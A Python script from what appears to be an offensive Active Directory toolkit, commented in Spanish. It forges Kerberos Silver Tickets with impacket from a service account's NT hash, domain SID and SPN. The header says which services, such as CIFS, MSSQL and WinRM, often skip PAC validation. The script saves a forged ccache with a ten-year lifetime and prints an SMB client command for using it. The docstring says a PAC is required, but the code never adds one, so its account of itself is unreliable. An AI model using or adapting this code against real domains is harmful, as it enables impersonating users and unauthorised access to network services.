# scripts/kerberos/tickets/silver_ticket.py
#
# Técnica: Silver Ticket
#
# Fundamento:
#   El Silver Ticket es como el Golden Ticket pero más quirúrgico y silencioso.
#   En vez de forjar un TGT (que va al KDC), forjamos un Service Ticket (ST)
#   directamente para un servicio específico.
#
#   El ST está cifrado con el hash de la CUENTA DEL SERVICIO (no de krbtgt).
#   Cuando el ST llega al servicio, este lo descifra con su propio hash → acepta.
#   El KDC nunca ve el ST falso → menos detectable.
#
#   Requisitos:
#     - Hash RC4 de la cuenta de servicio (ej. la cuenta que corre CIFS/SQL)
#     - Domain SID
#     - SPN objetivo (ej. cifs/SERVER01.corp.local)
#     - Usuario a impersonar
#
#   Limitaciones respecto al Golden Ticket:
#     - Solo vale para UN servicio (el que corresponde al SPN que forjas).
#     - Si el servicio valida el PAC contra el KDC (PAC validation), puede
#       detectarse. En la práctica, muchos servicios no lo hacen por defecto.
#
#   Servicios típicamente sin PAC validation (buenos objetivos):
#     - cifs (SMB) en servidores miembro no-DC
#     - mssql
#     - http/wsman (WinRM)

from scripts.base import BaseScript
from core.output import print_result, console
from core import session_db


class SilverTicketScript(BaseScript):
    name = "silver-ticket"
    description = "Forja un ST (Service Ticket) para un servicio específico sin pasar por el KDC"

    examples = [
        {"flag": "--service-hash",
         "desc": "NT hash de la cuenta que corre el servicio objetivo",
         "good": "kerberos --script=silver-ticket -d CORP.LOCAL -u jsmith --domain-sid S-1-5-21-111-222-333 --spn cifs/SRV01.corp.local --service-hash 8846f7eaee8fb117ad06bdd830b7586c",
         "bad": "kerberos --script=silver-ticket ... --service-hash <krbtgt_hash>  [el krbtgt hash no descifraría el ticket en el servicio objetivo]"},
        {"flag": "--spn",
         "desc": "SPN del servicio a forjar (formato servicio/host o servicio/host:puerto)",
         "good": "kerberos --script=silver-ticket ... --spn cifs/SRV01.corp.local",
         "bad": "kerberos --script=silver-ticket ... --spn SRV01.corp.local  [sin el prefijo de servicio, el SPN es inválido]"},
    ]

    def run(self, **kwargs):
        realm = (self.creds.domain or self.target.domain or "").upper()
        username = self.creds.user or "Administrator"
        service_hash = kwargs.get("service_hash")
        domain_sid = kwargs.get("domain_sid")
        spn = kwargs.get("spn")
        user_id = int(kwargs.get("user_id") or 500)
        kdc = self.target.ip or "local"

        for req, val in [("--service-hash", service_hash), ("--domain-sid", domain_sid), ("--spn", spn)]:
            if not val:
                console.print(f"[red]Falta {req}.[/red]"); return
        if not realm:
            console.print("[red]Falta -d/--domain.[/red]"); return

        service_nt = service_hash.split(":")[-1]
        spn_parts = spn.split("/", 1)
        if len(spn_parts) != 2:
            console.print(f"[red]SPN inválido: {spn}. Usa formato servicio/host[/red]"); return

        service_type, host = spn_parts[0], spn_parts[1]

        print_result("KRB", kdc, "info",
                     f"silver-ticket: forjando ST para {username}@{realm} → {spn}")

        ccache_path = self._forge_silver(
            realm, username, domain_sid, service_nt, service_type, host, user_id
        )

        if ccache_path:
            import os
            os.environ['KRB5CCNAME'] = f'FILE:{ccache_path}'
            print_result("KRB", kdc, "pwned",
                         f"Silver Ticket forjado: {spn} como {username}")
            console.print(f"[bold red]SILVER TICKET ACTIVO → {spn}[/bold red]")
            console.print(f"  export KRB5CCNAME=FILE:{ccache_path}")
            console.print(f"[dim]Úsalo con: impacket-smbclient -k -no-pass {host}[/dim]")
            session_db.save_finding(kdc, "KRB", "silver_ticket",
                                     f"{username}@{realm} → {spn} → {ccache_path}")
            return {'ccache': ccache_path}

    def _forge_silver(self, realm, username, domain_sid, service_nt, service_type, host, user_id) -> str | None:
        """
        Mismo mecanismo que golden_ticket pero ciframos con el hash del servicio
        (key_usage=2) y el sname es el SPN del servicio (no krbtgt).
        El PAC sigue siendo necesario (con los grupos del usuario a impersonar).
        """
        try:
            from impacket.krb5.crypto import Key, _enctype_table
            from impacket.krb5 import constants
            from impacket.krb5.asn1 import AS_REP, EncTicketPart, Ticket, EncTGSRepPart, seq_set
            from impacket.krb5.ccache import CCache
            from impacket.krb5.types import Principal, KerberosTime
            from pyasn1.codec.der import encoder as der_enc
            import datetime, os as _os

            service_key = Key(constants.EncryptionTypes.rc4_hmac.value,
                               bytes.fromhex(service_nt))
            cipher = _enctype_table[constants.EncryptionTypes.rc4_hmac.value]

            now = datetime.datetime.utcnow()
            session_key_bytes = _os.urandom(16)

            enc_ticket = EncTicketPart()
            enc_ticket['flags'] = constants.encodeFlags([
                constants.TicketFlags.forwardable.value,
                constants.TicketFlags.proxiable.value,
                constants.TicketFlags.pre_authent.value,
            ])
            enc_ticket['key'] = {'keytype': constants.EncryptionTypes.rc4_hmac.value,
                                  'keyvalue': session_key_bytes}
            enc_ticket['crealm'] = realm
            enc_ticket['cname'] = seq_set(
                Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            )
            enc_ticket['transited'] = {'tr-type': 0, 'contents': ''}
            enc_ticket['authtime'] = KerberosTime.toGeneralizedTime(now)
            enc_ticket['starttime'] = KerberosTime.toGeneralizedTime(now)
            enc_ticket['endtime'] = KerberosTime.toGeneralizedTime(
                now + datetime.timedelta(days=3650))

            enc_ticket_der = der_enc.encode(enc_ticket)
            enc_ticket_part = cipher.encrypt(service_key, 2, enc_ticket_der, None)

            ticket = Ticket()
            ticket['tkt-vno'] = 5
            ticket['realm'] = realm
            ticket['sname'] = seq_set(
                Principal(f'{service_type}/{host}',
                           type=constants.PrincipalNameType.NT_SRV_INST.value)
            )
            ticket['enc-part'] = {
                'etype': constants.EncryptionTypes.rc4_hmac.value,
                'cipher': enc_ticket_part
            }

            ccache = CCache()
            ccache.fromTGS(der_enc.encode(ticket), realm, username,
                            realm, f'{service_type}/{host}', session_key_bytes)
            out_path = f"/tmp/silver_{service_type}_{host.split('.')[0]}.ccache"
            ccache.saveFile(out_path)
            return out_path

        except Exception as e:
            console.print(f"[red]Error forjando Silver Ticket: {e}[/red]")
            return None
